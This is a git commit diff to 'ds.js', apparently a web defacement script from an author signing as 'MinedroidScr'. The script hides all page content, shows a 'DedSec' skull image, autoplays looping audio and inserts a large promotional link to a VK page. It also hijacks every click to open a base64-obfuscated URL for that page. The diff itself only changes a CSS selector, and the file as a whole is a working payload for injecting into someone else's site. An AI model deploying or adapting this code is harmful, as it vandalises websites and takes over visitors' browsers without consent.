a9390911f92277c7e7ea3894594f22cb57466e47
MinedroidScr <mineall@mail.ru>
2017-06-01 14:22:55 +0300

    Update ds.js

--- ds.js
+++ ds.js
@@ -1,7 +1,7 @@
 document.body.onclick=function(){
 window.open(atob('aHR0cHM6Ly92ay5jb20vbWluZWRyb2lk'))};
 var s = document.createElement('style');
-s.innerHTML="html{  display:block!important;  overflow: hidden;    background-size: 100;background:url('//orig08.deviantart.net/9039/f/2016/164/b/c/dedsec_skull_noise_by_junguler-da6229q.gif')} body{display:block!important} *{display:none}";
+s.innerHTML="body,html{  display:block!important;  overflow: hidden;    background-size: 100;background:url('//orig08.deviantart.net/9039/f/2016/164/b/c/dedsec_skull_noise_by_junguler-da6229q.gif')} body{display:block!important} *{display:none}";
 document.body.appendChild(s); 
 var d = document.createElement('div');
 d.innerHTML="<audio autoplay loop preload><source src=//cdn.discordapp.com/attachments/262613671039991809/319385603785621504/DedSec_-_.mp3 type=audio/mpeg></audio>"+'<a href="//vk.com/minedroid" target="_blank" style="display:block !important;color: white !important;font-family: Hacked, sans-serif !important; font-size: 7em !important;   outline: none;    text-decoration: none;    color: white;">vk.com/Minedroid</a>';
